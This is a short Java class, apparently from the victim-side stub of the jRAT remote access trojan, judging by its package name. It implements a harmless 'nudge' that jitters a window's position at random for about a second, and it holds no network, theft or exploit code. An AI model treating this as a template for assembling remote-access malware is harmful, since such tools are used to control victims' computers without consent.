package io.jrat.stub;

import java.util.Random;
import javax.swing.JFrame;

public class Nudge extends Thread {

	public JFrame frame;

	public Nudge(JFrame frame) {
		this.frame = frame;
	}

	public void run() {
		int rx = frame.getLocation().x;
		int ry = frame.getLocation().y;
		for (int i = 0; i < 100; i++) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
			}
			Random rr = new Random();
			int x = rx + rr.nextInt(10);
			int y = ry + rr.nextInt(10);
			frame.setLocation(x, y);
		}
	}

}
